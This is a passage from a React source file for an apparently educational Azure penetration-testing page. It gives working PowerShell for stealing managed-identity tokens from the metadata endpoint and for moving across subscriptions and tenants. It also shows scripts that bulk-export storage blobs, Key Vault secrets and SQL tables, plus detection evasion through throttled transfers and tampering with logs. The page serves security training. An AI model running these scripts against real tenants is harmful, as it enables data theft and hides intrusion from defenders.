# Now you can authenticate as the service principal
$tenantId = "00000000-0000-0000-0000-000000000000"
$applicationId = $sp.AppId
$clientSecret = "SuperSecretPassword123"

$tokenBody = @{
    grant_type    = "client_credentials"
    client_id     = $applicationId
    client_secret = $clientSecret
    resource      = "https://management.azure.com/"
}
$tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$tenantId/oauth2/token" -Method Post -Body $tokenBody
$tokenResponse.access_token`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">Automated Testing Tools:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li><strong>PowerZure</strong> - PowerShell framework for assessing Azure security</li>
                      <li><strong>AzureHound/BloodHound</strong> - Graph-based Azure AD privilege escalation path finder</li>
                      <li><strong>MicroBurst</strong> - Collection of PowerShell tools for Azure assessment</li>
                      <li><strong>ROADtools</strong> - Azure AD exploration framework</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-4">
                  <AccordionTrigger className="text-lg font-medium">4. Lateral Movement</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase involves moving between different Azure resources, services, or tenants after gaining initial access.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Moving between Azure subscriptions</li>
                      <li>Accessing resources across resource groups</li>
                      <li>Exploiting trust relationships between Azure AD tenants</li>
                      <li>Using managed identities to access different services</li>
                      <li>Leveraging VNet peering connections</li>
                      <li>Using hybrid identity systems to pivot to on-premises</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Lateral Movement Techniques:</h5>
                    <div className="space-y-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Cross-Subscription Movement</h6>
                        <p className="text-sm mb-2">Moving between subscriptions in the same tenant:</p>
                        <CodeExample 
                          language="powershell"
                          title="Cross-Subscription Movement"
                          code={`# List available subscriptions
Connect-AzAccount -Credential $cred
Get-AzSubscription

# Change to different subscription
Select-AzSubscription -SubscriptionId "00000000-0000-0000-0000-000000000000"

# Check what resources you can access in the new subscription
Get-AzResourceGroup
Get-AzVM
Get-AzStorageAccount

# Check role assignments in the new subscription
Get-AzRoleAssignment -SignInName user@example.com`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Managed Identity Service-to-Service Movement</h6>
                        <p className="text-sm mb-2">Using managed identities to access different services:</p>
                        <CodeExample 
                          language="powershell"
                          title="Managed Identity Service Movement"
                          code={`# From a compromised VM or App Service with managed identity
# Get token for different resource endpoints
$azureManagementToken = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata="true"}
$keyVaultToken = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -Headers @{Metadata="true"}
$storageToken = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/' -Headers @{Metadata="true"}

# Access Key Vault with the token
$kvToken = ($keyVaultToken.Content | ConvertFrom-Json).access_token
$kvHeaders = @{ 'Authorization' = "Bearer $kvToken" }
Invoke-RestMethod -Uri 'https://target-keyvault.vault.azure.net/secrets?api-version=7.0' -Headers $kvHeaders

# Access Storage with the token
$stToken = ($storageToken.Content | ConvertFrom-Json).access_token
$stHeaders = @{ 'Authorization' = "Bearer $stToken" }
Invoke-RestMethod -Uri 'https://targetstorageacct.blob.core.windows.net/container?comp=list&restype=container' -Headers $stHeaders`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Cross-Tenant Movement</h6>
                        <p className="text-sm mb-2">Moving between different Azure AD tenants:</p>
                        <CodeExample 
                          language="powershell"
                          title="Cross-Tenant Movement"
                          code={`# Check for guest accounts in multiple tenants
Connect-AzureAD
Get-AzureADUser -Filter "userType eq 'Guest'" | Select-Object DisplayName, UserPrincipalName, UserType

# Check for applications with multi-tenant consent
Get-AzureADServicePrincipal -All $true | Where-Object {$_.Tags -contains "WindowsAzureActiveDirectoryIntegratedApp"} | Select-Object DisplayName, AppId, PublisherName

# If you have a compromised account with guest access to other tenants:
# First, get the tenant ID of the guest tenant
$guestTenantId = "00000000-0000-0000-0000-000000000000"

# Authenticate to the guest tenant
Connect-AzAccount -TenantId $guestTenantId -Credential $cred

# Check what resources you can access
Get-AzSubscription
Get-AzResourceGroup`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">VNet Peering Exploitation:</h5>
                    <CodeExample 
                      language="powershell"
                      title="VNet Peering Exploitation"
                      code={`# From a compromised VM, check for VNet peering
# First, identify the VM's VNet
$vm = Get-AzVM -Name "compromised-vm" -ResourceGroupName "target-rg"
$nic = Get-AzNetworkInterface -ResourceId $vm.NetworkProfile.NetworkInterfaces[0].Id
$vnet = Get-AzVirtualNetwork | Where-Object { $_.Subnets.Id -contains $nic.IpConfigurations[0].Subnet.Id }

# Check for VNet peerings
$peerings = $vnet.VirtualNetworkPeerings
$peerings

# Scan for hosts in peered VNets
foreach ($peering in $peerings) {
    $peeredVNet = Get-AzVirtualNetwork -Name $peering.RemoteVirtualNetwork.Id.Split('/')[-1]
    foreach ($subnet in $peeredVNet.Subnets) {
        $prefix = $subnet.AddressPrefix[0]
        # From the compromised VM, you would scan this subnet
        Write-Host "Scan subnet $prefix in peered VNet"
    }
}`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-5">
                  <AccordionTrigger className="text-lg font-medium">5. Data Exfiltration Testing</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase tests the ability to extract sensitive data from the Azure environment and evaluates data protection controls.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Identifying sensitive data in Storage accounts</li>
                      <li>Testing SQL Database access controls and encryption</li>
                      <li>Extracting secrets from Key Vault</li>
                      <li>Testing data exfiltration prevention controls</li>
                      <li>Evaluating Azure Monitor and Log Analytics evasion</li>
                      <li>Testing network-level data loss prevention</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Common Exfiltration Techniques:</h5>
                    <div className="space-y-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Storage Account Data Exfiltration</h6>
                        <p className="text-sm mb-2">Extracting data from Storage accounts:</p>
                        <CodeExample 
                          language="powershell"
                          title="Storage Data Exfiltration"
                          code={`# Using Storage Explorer capabilities with gained access
Connect-AzAccount -Credential $cred
$storageAccounts = Get-AzStorageAccount

foreach ($sa in $storageAccounts) {
    $keys = Get-AzStorageAccountKey -ResourceGroupName $sa.ResourceGroupName -Name $sa.StorageAccountName
    $key = $keys[0].Value
    $ctx = New-AzStorageContext -StorageAccountName $sa.StorageAccountName -StorageAccountKey $key
    
    # List containers
    $containers = Get-AzStorageContainer -Context $ctx
    foreach ($container in $containers) {
        # List blobs in the container
        $blobs = Get-AzStorageBlob -Container $container.Name -Context $ctx
        
        # Look for interesting files
        $sensitiveBlobs = $blobs | Where-Object { 
            $_.Name -match "password|secret|key|config|backup|dump" 
        }
        
        # Download sensitive files
        foreach ($blob in $sensitiveBlobs) {
            Get-AzStorageBlobContent -Container $container.Name -Blob $blob.Name -Context $ctx -Destination "./exfil/"
        }
    }
}`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Key Vault Data Exfiltration</h6>
                        <p className="text-sm mb-2">Extracting secrets from Key Vault:</p>
                        <CodeExample 
                          language="powershell"
                          title="Key Vault Data Exfiltration"
                          code={`# With appropriate permissions, extract Key Vault secrets
Connect-AzAccount -Credential $cred
$keyVaults = Get-AzKeyVault

foreach ($kv in $keyVaults) {
    # Get all secrets from the vault
    $secrets = Get-AzKeyVaultSecret -VaultName $kv.VaultName
    
    # Export secrets to file
    foreach ($secret in $secrets) {
        $secretValue = Get-AzKeyVaultSecret -VaultName $kv.VaultName -Name $secret.Name -AsPlainText
        Add-Content -Path "./extracted-secrets.txt" -Value "$($secret.Name): $secretValue"
    }
    
    # Get all keys from the vault
    $keys = Get-AzKeyVaultKey -VaultName $kv.VaultName
    Add-Content -Path "./extracted-keys.txt" -Value "Key Vault: $($kv.VaultName)"
    foreach ($key in $keys) {
        Add-Content -Path "./extracted-keys.txt" -Value "Key: $($key.Name), ID: $($key.Id)"
    }
    
    # Get all certificates from the vault (more complex to extract actual certificate contents)
    $certs = Get-AzKeyVaultCertificate -VaultName $kv.VaultName
    Add-Content -Path "./extracted-certs.txt" -Value "Key Vault: $($kv.VaultName)"
    foreach ($cert in $certs) {
        Add-Content -Path "./extracted-certs.txt" -Value "Certificate: $($cert.Name), Subject: $($cert.Certificate.Subject)"
    }
}`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">SQL Database Exfiltration</h6>
                        <p className="text-sm mb-2">Extracting data from Azure SQL Databases:</p>
                        <CodeExample 
                          language="powershell"
                          title="SQL Data Exfiltration"
                          code={`# With appropriate permissions, connect to SQL databases
# First, list SQL Servers and Databases
Connect-AzAccount -Credential $cred
$sqlServers = Get-AzSqlServer
$extractedData = @()

foreach ($server in $sqlServers) {
    $databases = Get-AzSqlDatabase -ServerName $server.ServerName -ResourceGroupName $server.ResourceGroupName | Where-Object { $_.DatabaseName -ne "master" }
    
    foreach ($db in $databases) {
        Write-Host "Attempting to extract data from $($db.DatabaseName) on $($server.ServerName)"
        
        # If you have credentials or managed identity access:
        $creds = Get-Credential
        $connString = "Server=tcp:$($server.ServerName).database.windows.net,1433;Initial Catalog=$($db.DatabaseName);User ID=$($creds.UserName);Password=$($creds.GetNetworkCredential().Password);Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;"
        
        try {
            $conn = New-Object System.Data.SqlClient.SqlConnection($connString)
            $conn.Open()
            
            # Example query - customize based on target database
            $query = "SELECT TOP 100 * FROM INFORMATION_SCHEMA.TABLES; SELECT name FROM sys.tables;"
            $cmd = New-Object System.Data.SqlClient.SqlCommand($query, $conn)
            $reader = $cmd.ExecuteReader()
            
            $tables = New-Object System.Collections.ArrayList
            
            while ($reader.Read()) {
                $tables.Add($reader["TABLE_NAME"])
            }
            
            $reader.NextResult()
            
            while ($reader.Read()) {
                if (-not $tables.Contains($reader["name"])) {
                    $tables.Add($reader["name"])
                }
            }
            
            $reader.Close()
            
            # For each table, extract sample data
            foreach ($table in $tables) {
                $dataQuery = "SELECT TOP 10 * FROM [$table]"
                try {
                    $dataCmd = New-Object System.Data.SqlClient.SqlCommand($dataQuery, $conn)
                    $dataReader = $dataCmd.ExecuteReader()
                    
                    $dt = New-Object System.Data.DataTable
                    $dt.Load($dataReader)
                    $dt | Export-Csv -Path "./exfil/$($server.ServerName)_$($db.DatabaseName)_$table.csv" -NoTypeInformation
                    
                    $dataReader.Close()
                } catch {
                    Write-Host "Error querying table $table"
                }
            }
            
            $conn.Close()
        } catch {
            Write-Host "Error connecting to database $($db.DatabaseName)"
        }
    }
}`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">Evading Detection:</h5>
                    <CodeExample 
                      language="powershell"
                      title="Detection Evasion"
                      code={`# Check what monitoring is in place
Connect-AzAccount -Credential $cred

# Check for Azure Monitor diagnostic settings
$diagnosticSettings = Get-AzDiagnosticSetting

# Check for Log Analytics workspaces
$logWorkspaces = Get-AzOperationalInsightsWorkspace

# Check for Azure Sentinel
$sentinelWorkspaces = Get-AzOperationalInsightsWorkspace | Where-Object {
    $solutions = Get-AzOperationalInsightsIntelligencePack -ResourceGroupName $_.ResourceGroupName -WorkspaceName $_.Name
    $solutions | Where-Object { $_.Name -eq "SecurityInsights" -and $_.Enabled -eq $true }
}

# Techniques to evade detection:
# 1. Operate within "normal" business hours
# 2. Make small, incremental data transfers rather than large bulk operations
# 3. Use legitimate administrative tools when possible
# 4. Avoid triggering rate limits or threshold-based alerts
# 5. If possible, delete or modify logs after extraction

# Example of staged exfiltration (small batches)
$saContext = New-AzStorageContext -StorageAccountName "targetaccount" -StorageAccountKey "key"
$blobs = Get-AzStorageBlob -Container "sensitive-data" -Context $saContext

# Extract in small batches with delays
$batchSize = 5
for ($i = 0; $i -lt $blobs.Count; $i += $batchSize) {
    $batch = $blobs[$i..([Math]::Min($i + $batchSize - 1, $blobs.Count - 1))]
    foreach ($blob in $batch) {
        Get-AzStorageBlobContent -Container "sensitive-data" -Blob $blob.Name -Context $saContext -Destination "./exfil/"
    }
    # Random delay between 30-120 seconds
    $delay = Get-Random -Minimum 30 -Maximum 120
    Start-Sleep -Seconds $delay
}`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
          </TabsContent>
          
          <TabsContent value="tools" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Essential Azure Penetration Testing Tools</h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <h4 className="text-xl font-bold mb-2">MicroBurst</h4>
                  <p className="mb-2">A collection of PowerShell scripts for Azure security assessment and exploitation.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Storage account enumeration</li>
                      <li>Key Vault scanning</li>
                      <li>Azure resource scanning</li>
                      <li>Service principal enumeration</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">AzureHound</h4>
                  <p className="mb-2">Data collector for BloodHound, focused on Azure AD security assessment.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Visual mapping of Azure AD attack paths</li>
                      <li>Discovery of privilege escalation opportunities</li>
                      <li>Analysis of permission relationships</li>
                      <li>Identification of tenant-wide security issues</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">ScoutSuite</h4>
                  <p className="mb-2">Multi-cloud security auditing tool with Azure support.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Comprehensive Azure service coverage</li>
                      <li>Rules-based assessment approach</li>
                      <li>Detailed security findings</li>
                      <li>Web-based reporting dashboard</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">ROADtools</h4>
                  <p className="mb-2">Azure AD exploration framework for security assessments.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Azure AD data collection and analysis</li>
                      <li>Graphical interface for exploring relationships</li>
                      <li>Permission analysis capabilities</li>
                      <li>Authentication method assessment</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">PowerZure</h4>
                  <p className="mb-2">PowerShell framework for assessing and exploiting Azure resources.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Reconnaissance functions</li>
                      <li>Privilege escalation techniques</li>
                      <li>Post-exploitation capabilities</li>
                      <li>Object manipulation in Azure</li>
                    </ul>
                  </div>
                </div>
                
                <div>
                  <h4 className="text-xl font-bold mb-2">Azure CLI</h4>
                  <p className="mb-2">Official command-line interface for Azure, essential for penetration testing.</p>
                  <div className="bg-cybr-muted/50 p-3 rounded">
                    <h5 className="font-semibold mb-1">Key Features:</h5>
                    <ul className="list-disc list-inside text-sm">
                      <li>Complete API coverage for Azure services</li>
                      <li>Scriptable for automated testing</li>
                      <li>Cross-platform compatibility</li>
                      <li>JSON output for programmatic processing</li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </div>
    </section>
  );
};

export default AzureSection;
